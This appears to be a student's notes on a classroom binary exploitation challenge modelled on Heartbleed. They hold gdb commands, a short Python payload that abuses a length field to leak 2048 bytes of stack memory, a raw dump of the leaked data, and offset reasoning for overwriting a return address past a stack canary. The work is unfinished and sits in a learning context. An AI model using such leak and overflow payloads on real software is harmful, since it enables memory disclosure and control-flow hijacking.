--------------------

Years ago there was this neat little bug discovered in OpenSSL, which became known as "Heartbleed". The world's first bug with a name. Heck, it even had a logo! :) That fad has really caught on since... ShellShock, Log4Shell, DirtyCOW, Spectre, Meltdown, and the list goes on. If you've found a bug and need a name, here's a handy resource: https://paulbellamy.com/vulnerability-name-generator/

I have attempted to recreate something similar to Heartbleed here for you. It's definitely buggy, but I made sure to enable both stack cookies and DEP/NX, meaning it should be super-duper impossible to exploit... right?

In keeping with tradition, since this is a more difficult challenge I will only require that you give it your best effort. I would like to see everyone at least attempt it, but I won't require a full working solution for full credit. That said, if you land a shell I'll be very impressed!

--------------------

2022.09.27.2315.EST

[HELPFUL] https://stackabuse.com/how-to-exploit-the-heartbleed-bug/

If I run gdb's [x/64x 0x7fffffffe008] I get a list of additional addresses that seem to gradually increase in value padded by 0x7fff
I have no idea what I'm looking at

When main is broken into rsp/rbp is located at 0xde80 and contains rbp (libc's init) of 0x0000000000402ee0
and subsequently the return addr (libc's start main) of 0x402710
These addresses are stored in memory at location 0x7fffffffde80
Once the 420 bytes are pushed (the two integers of length 8 bytes each and the 1024 bytes for the data[1024])
we arrive at rsp of 0x7fffffffda60 which is correct
But when I run [x/420x $rsp] I am provided with 680 bytes rather than 0x420...
I have no idea why I'm getting more bytes than I'm asking for

What we WANT to see are these values:
0x007fffffffdf00│+0x0000: 0x00000000402ee0  →  <__libc_csu_init+0> endbr64       ← $rsp, $rbp
0x007fffffffdf08│+0x0008: 0x00000000402710  →  <__libc_start_main+1168> mov edi, eax
Since these are what the top of the stack looks like right before pushing rsp back to accomidate the 0x420 bytes

When I run the payload:
payload = b""
payload += b"2048:"
payload += b"A"*1024
payload += b"\n"
I get the following:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\x00    \x87C\x13,\xe0.@\x00\x00\x00'@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xff\xff\xff\x7f\x00>\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00j\x9f·>\xdb\xeb\x80/@\x00\x00\x00\x00\x00\x00\x00\xf0M\x00\x00\x00\x00\x00\x00j\x7f!\xc8\xc1$\x14j\xdd\xd2\xb7>\xdb\xeb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8e\x1c\x00\x00\x00\xe0\xff\xff\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe3\xff\xff\xff\x7f\x00\x00\x00\x00\x00u\xe3\xff\xff\xff\x7f\x00\x84\xe3\xff\xff\xff\x7f\x00\x98\xe3\xff\xff\xff\x7f\x00\xbb\xe3\xff\xff\xff\x7f\x00\xf1\xe3\xff\xff\xff\x7f\x00\x12\xff\xff\xff\x7f\x00\x1f\xff\xff\xff\x7f\x00=\xe4\xff\xff\xff\x7f\x00Y\xe4\xff\xff\xff\x7f\x00m\xe4\xff\xff\xff\x7f\x00\x89\xe4\xff\xff\xff\x7f\x00\x99\xe4\xff\xff\xff\x7f\x00\xaa\xe4\xff\xff\xff\x7f\x00\xb4\xe4\xff\xff\xff\x7f\x00\xc1\xe4\xff\xff\xff\x7f\x00\xe0\xe4\xff\xff\xff\x7f\x00>\xe5\xff\xff\xff\x7f\x00\\xe5\xff\xff\xff\x7f\x00\x94\xe5\xff\xff\xff\x7f\x00\xa7\xe5\xff\xff\xff\x7f\x00\xc5\xe5\xff\xff\xff\x7f\x00\xe0\xe5\xff\xff\xff\x7f\x00,\xe6\xff\xff\xff\x7f\x00?\xe6\xff\xff\xff\x7f\x00Q\xe6\xff\xff\xff\x7f\x00\x7f\xe6\xff\xff\xff\x7f\x00\x93\xe6\xff\xff\xff\x7f\x00\x9d\xe6\xff\xff\xff\x7f\x00\xa8\xe6\xff\xff\xff\x7f\x00\xca\xe6\xff\xff\xff\x7f\x00\xe3\xe6\xff\xff\xff\x7f\x00\xfc\xe6\xff\xff\xff\x00D\xe7\xff\xff\xff\x7f\x00t\xe7\xff\xff\xff\x7f\x00\x8a\xe7\xff\xff\xff\x7f\x00\xa9\xe7\xff\xff\xff\x7f\x00\xb8\xe7\xff\xff\xff\x7f\x00\xec\xe7\xff\xff\xff\x7f\x00\x03\xff\xff\xff\x7f\x00(\xe8\xff\xff\xff\x7f\x009\xe8\xff\xff\xff\x7f\x00s\xe8\xff\xff\xff\x7f\x00\x88\xe8\xff\xff\xff\x7f\x00\x93\xe8\xff\xff\xff\x7f\x00\xd6\xe8\xff\xff\xff\x7f\x00\xde\xe8\xff\xff\xff\x7f\x00\x19\xff\xff\xff\x7f\x0\xef\xff\xff\xff\x7f\x00 \xef\xff\xff\xff\x7f\x008\xef\xff\xff\xff\x7f\x00M\xef\xff\xff\xff\x7f\x00f\xef\xff\xff\xff\x7f\x00{\xef\xff\xff\xff\x7f\x00\x93\xef\xff\xff\xff\x7f\x00\xa8\xef\xff\xff\xff\x7f\x00\x00\x00\x00\x00!\x00\x00\x00\x00\xd0\xff\xf7\xff\x00\x00\x00\x00\x00\xfb\x8b\x00\x06\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00Waiting for heart beat request...

Okay so I did a dumb dumb. Turns out I was screwing the entire alignment up because I didn't account for the additional newline character
However I'm still getting weird issues accessing the return pointer. I'm missing the last nibble for some reason and I don't know why

So to be clear our return pointer SHOULD be at:
([First two integers] 16 + 16) do not count as the data buffer is created after these are pushed to the stack
([data] 1024) + ([Stack Padding?] 16 + 16) + ([rbp] 16) = 1072 (0x430)

Okay I'm able to overwrite the desired return address, however stack canary is being triggered
I actually don't know how to properly bypass this tbh. I knew before but have since forgotten

Could it be that those two bytes after data[1024] on the stack is actually the cookie?
